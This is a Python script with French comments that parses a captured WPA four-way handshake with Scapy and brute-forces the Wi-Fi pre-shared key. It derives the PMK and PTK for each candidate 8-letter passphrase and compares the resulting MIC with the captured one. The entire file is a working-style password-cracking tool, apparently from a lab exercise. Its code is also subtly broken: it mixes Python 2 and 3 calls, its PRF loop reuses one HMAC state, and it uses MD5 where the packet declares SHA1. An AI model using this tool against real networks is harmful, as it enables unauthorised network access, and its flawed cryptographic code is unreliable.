#!/usr/bin/python

from scapy.all import *
from pbkdf2 import PBKDF2
import hmac, hashlib,time,binascii
from itertools import product

class WPA_key(Packet):
    name = "WPA_key"
    fields_desc = [ ByteField("descriptor_type", 1),
            BitField("SMK_message",0,3),
            BitField("encrypted_key_data",0,1),
            BitField("request",0,1),
            BitField("error",0,1),
            BitField("secure",0,1),
            BitEnumField("key_MIC",0,1,{0:'not present',1:'present'}),
            BitField("key_ACK",1,1),
            BitField("install",0,1),
            BitField("key_index",0,2),
            BitEnumField("key_type",1,1,{0:'Group Key',1:'Pairwise Key'}),
            BitEnumField("key_descriptor_Version",2,3,{1:'HMAC-MD5 MIC', 
                2:'HMAC-SHA1 MIC'}),
            LenField("len", None, "H"),
            StrFixedLenField("replay_counter", "", 8),
            StrFixedLenField("nonce", "", 32),
            StrFixedLenField("key_iv", "", 16),
            StrFixedLenField("wpa_key_rsc", "", 8),
            StrFixedLenField("wpa_key_id", "", 8),
            StrFixedLenField("wpa_key_mic", "", 16),
            LenField("wpa_key_length", None, "H"),
            StrLenField("wpa_key", "", length_from=lambda pkt:pkt.wpa_key_length)]

    def extract_padding(self, s): 
        l = self.len 
        return s[:l],s[l:] 
    def hashret(self): 
        return chr(self.type)+self.payload.hashret() 
    def answers(self, other): 
        if isinstance(other,WPA_key): 
            return 1 
        return 0 
      
bind_layers( EAPOL, WPA_key, type=3)

def cs(a) :
    return a.decode('hex')

#fonction qui convertit une chaine d'octets en entier
def fromBytesToInt(b) :
    return int.from_bytes(b, byteorder='big', signed=False)

def strtoint(chaine):
    return int(chaine.encode('hex'),16)

#pseudo-Random Function
def prf(K, A, B, n) :
    i = 0
    R = ""
    octet = 0
    temp = binascii.hexlify(A) + '{:02x}'.format(octet) + B + '{:02x}'.format(i)
    mon_hashmac = hmac.new(binascii.unhexlify(K), digestmod=hashlib.sha1)
    mon_hashmac.update(binascii.unhexlify(temp))
    r = mon_hashmac.digest()
    R = R + r
    n = (n / 8)
    while(len(R) < n) :
        i = i + 1
        temp = binascii.hexlify(A) + '{:02x}'.format(octet) + B + '{:02x}'.format(i)
        #mon_hashmac = hmac.new(binascii.unhexlify(K), digestmod=hashlib.sha1)
        mon_hashmac.update(binascii.unhexlify(temp))
        r = mon_hashmac.digest()
        R = R + r
    return R[:n]


#Fonction qui retourne la chaine de caratere LowerMac||HigherMac
def getLowerMacAdress(addr1, addr2) :
    temp1 = addr1.split(':')
    ad1 = ""
    for elem in temp1 :
        ad1 = ad1 + elem
    temp2 = addr2.split(':')
    ad2 = ""
    for elem in temp2 :
        ad2 = ad2 + elem
    i = len(ad1) - 1	
    mult = 1
    s1 = 0
    while(i >= 0) :
        n = int(ad1[i], 16)
        s1 = s1 + n * mult
        mult = mult * 16
        i = i - 1
    i = len(ad2) - 1
    mult = 1
    s2 = 0
    while(i >= 0) :
        n = int(ad2[i], 16)
        s2 = s2 + n * mult
        mult = mult * 16
        i = i - 1
    if(s1 <= s2):
        return (ad1 + ad2)
    else :
        return (ad2 + ad1)

#fonction qui retourne la chaine de caracteres LowerNonce||HigherNonce
def getLowerNonce(nonce1, nonce2) :
    s1 = int(nonce1,16)
    s2 = int(nonce2,16)
    if(s1 >= s2) :
        return (nonce2 + nonce1)
    else :
        return (nonce1 +nonce2)

#fonction qui permet de calculer la chaine de caracteres LowerMac||HigherMac||LowerNonce||HigherNonce
def getAttributeBOfPRF(addr1, addr2, nonce1, nonce2) :
    LowerMacHigherMac = getLowerMacAdress(addr1, addr2)
    LOwerNonceHigherNonce = getLowerNonce(nonce1, nonce2)
    return (LowerMacHigherMac + LOwerNonceHigherNonce)

#fonction qui permet d'extraire la KCK (Key Confirmation Key) a partir de la PTK qui correspond aux 128 premiers bits:
def getKCK(prf):
    return binascii.hexlify(prf)[:32]

def generatePSK(length_word, init_psk) :
    if(len(init_psk) >= length_word) :
        return []
    l1 = []
    for elem in range(97, 123) :
        temp = init_psk + chr(elem)
        l1.append(temp)
    final_list = l1
    for i in range(0, length_word - len(initial_psk) - 1) :
        final_list = []
        for word in l1 :
            for elem in range(97, 123) :
                temp = word + chr(elem)
                final_list.append(temp)
        l1 = final_list
    return final_list

def testLengthOfAllWordsIsOk(liste_words, length_word, init_psk) : 
    for elem in liste_words :
        if((len(elem) != length_word) or (elem[0 : len(init_psk)] != init_psk)) :
            return False
    return True

#print(liste_psk2)
initial_psk = "aaaa"
length_wrd = 8
liste_psk = generatePSK(length_wrd, initial_psk) # generatePsk(8) retourne tous les psk de longueur 8 et commencant par la chaine "aaaa"

print("Tous les mots de la liste ont une longueur egale a ", length_wrd, " et commencant par ", initial_psk, "?",testLengthOfAllWordsIsOk(liste_psk, length_wrd, initial_psk))
l = rdpcap("capture_wpa.pcap")
list_packets_handshakes = [pk for pk in l if pk.haslayer(WPA_key)]
packet0 = l[0]
packet1 = l[1]
packet2 = l[2]
packet3 = l[3]
packet4 = l[4]

mac_addr_STA = packet2.addr2
mac_addr_PA = packet2.addr1
nonce_PA_Station = binascii.hexlify((packet3.nonce))
nonce_Station_PA = binascii.hexlify((packet2.nonce))
ssid = (l[0].info)
mic = (packet4.wpa_key_mic)
print("l'adresse MAC du point d'acces est :", mac_addr_PA)
print("\n")
print("l'adresse MAC de la station est :", mac_addr_STA)
print("\n")
print("le SSID (Identifiant du point d'acces) est :", ssid)
print("\n")
print("Nonce Ao envoye du point d'acces vers la station : ",nonce_PA_Station)
print("\n")
print("Nonce So envoye de la station vers le point d'acces : ",nonce_Station_PA)
print('\n')
print("wpa_key_mic : ",binascii.hexlify(mic))
print('\n')

packet_to_compare = l[4].getlayer(EAPOL)
packet_to_compare.key_ACK = 0
packet_to_compare.wpa_key_mic = ''
length_psk = len(liste_psk)
concat_str =  getAttributeBOfPRF(mac_addr_STA, mac_addr_PA, nonce_Station_PA, nonce_PA_Station)
hex_mic = binascii.hexlify(mic) 
for i,psk in enumerate(liste_psk):
    f = PBKDF2(psk, ssid, 4096) #il faut extraire M1WPA de l[0] M1WPA = \x
    pmk = binascii.hexlify(f.read(32))
    p = prf(pmk, "Pairwise key expansion", concat_str, 512)
    kck = getKCK(p)
    mon_hashmac = hmac.new(binascii.unhexlify(kck),digestmod=hashlib.md5)
    mon_hashmac.update(bytes(packet_to_compare))
    val_hmac = mon_hashmac.digest()
    result = binascii.hexlify(val_hmac)
    sys.stdout.write('\r')
    sys.stdout.write("%f%% %s" % (((i * 100)/float(length_psk)),psk))
    if(result == hex_mic):
        print("PSK = " + psk)
        break

